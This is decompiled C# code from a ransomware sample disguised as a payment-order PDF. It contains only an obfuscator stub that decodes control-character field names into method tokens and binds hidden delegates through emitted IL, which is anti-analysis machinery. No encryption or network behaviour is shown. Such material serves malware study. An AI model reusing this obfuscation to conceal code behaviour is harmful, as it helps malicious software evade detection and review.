// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Payment-Order-(Copy).Pdfi, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F70914EF-5364-4930-8ADC-EFA87D5FFE39
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-18a2ad320bfe0f724ced2712bb2ad0cd99d11a4e67ef509cea062cfda7166e33.exe

using \u0003\u0006;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0003\u0006
{
  [\u0001.\u0001]
  [\u0003.\u0001]
  internal static class \u0002\u0006
  {
    private static ModuleHandle \u0001;
    private static char[] \u0001 = new char[58]
    {
      '\u0001',
      '\u0002',
      '\u0003',
      '\u0004',
      '\u0005',
      '\u0006',
      '\a',
      '\b',
      '\u000E',
      '\u000F',
      '\u0010',
      '\u0011',
      '\u0012',
      '\u0013',
      '\u0014',
      '\u0015',
      '\u0016',
      '\u0017',
      '\u0018',
      '\u0019',
      '\u001A',
      '\u001B',
      '\u001C',
      '\u001D',
      '\u001E',
      '\u001F',
      '\u007F',
      '\u0080',
      '\u0081',
      '\u0082',
      '\u0083',
      '\u0084',
      '\u0086',
      '\u0087',
      '\u0088',
      '\u0089',
      '\u008A',
      '\u008B',
      '\u008C',
      '\u008D',
      '\u008E',
      '\u008F',
      '\u0090',
      '\u0091',
      '\u0092',
      '\u0093',
      '\u0094',
      '\u0095',
      '\u0096',
      '\u0097',
      '\u0098',
      '\u0099',
      '\u009A',
      '\u009B',
      '\u009C',
      '\u009D',
      '\u009E',
      '\u009F'
    };

    [\u0001.\u0001]
    [\u0002.\u0001]
    [\u0003.\u0001]
    public static void \u0001\u0006([In] int obj0)
    {
      Type typeFromHandle;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(\u0002\u0006.\u0001.ResolveTypeHandle(33554433 + obj0));
      }
      catch
      {
        return;
      }
      foreach (FieldInfo field in typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField))
      {
        string name = field.Name;
        bool flag = false;
        int num = 0;
        for (int index1 = name.Length - 1; index1 >= 0; --index1)
        {
          char ch = name[index1];
          if (ch == '~')
          {
            flag = true;
            break;
          }
          for (int index2 = 0; index2 < 58; ++index2)
          {
            if ((int) \u0002\u0006.\u0001[index2] == (int) ch)
            {
              num = num * 58 + index2;
              break;
            }
          }
        }
        MethodInfo methodFromHandle;
        try
        {
          methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\u0002\u0006.\u0001.ResolveMethodHandle(num + 167772161));
        }
        catch
        {
          continue;
        }
        Delegate @delegate;
        if (methodFromHandle.IsStatic)
        {
          try
          {
            @delegate = Delegate.CreateDelegate(field.FieldType, methodFromHandle);
          }
          catch (Exception ex)
          {
            continue;
          }
        }
        else
        {
          ParameterInfo[] parameters = methodFromHandle.GetParameters();
          int length = parameters.Length + 1;
          Type[] parameterTypes = new Type[length];
          parameterTypes[0] = typeof (object);
          for (int index = 1; index < length; ++index)
            parameterTypes[index] = parameters[index - 1].ParameterType;
          DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, methodFromHandle.ReturnType, parameterTypes, typeFromHandle, true);
          ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
          ilGenerator.Emit(OpCodes.Ldarg_0);
          if (length > 1)
            ilGenerator.Emit(OpCodes.Ldarg_1);
          if (length > 2)
            ilGenerator.Emit(OpCodes.Ldarg_2);
          if (length > 3)
            ilGenerator.Emit(OpCodes.Ldarg_3);
          if (length > 4)
          {
            for (int index = 4; index < length; ++index)
              ilGenerator.Emit(OpCodes.Ldarg_S, index);
          }
          ilGenerator.Emit(OpCodes.Tailcall);
          ilGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodFromHandle);
          ilGenerator.Emit(OpCodes.Ret);
          try
          {
            @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
          }
          catch
          {
            continue;
          }
        }
        try
        {
          field.SetValue((object) null, (object) @delegate);
        }
        catch
        {
        }
      }
    }

    static \u0002\u0006()
    {
      Type type1 = typeof (MulticastDelegate);
      if (true)
        goto label_3;
label_1:
      Type type2;
      if ((object) type2 == null)
        return;
      \u0002\u0006.\u0001 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
      return;
label_3:
      type2 = type1;
      goto label_1;
    }
  }
}
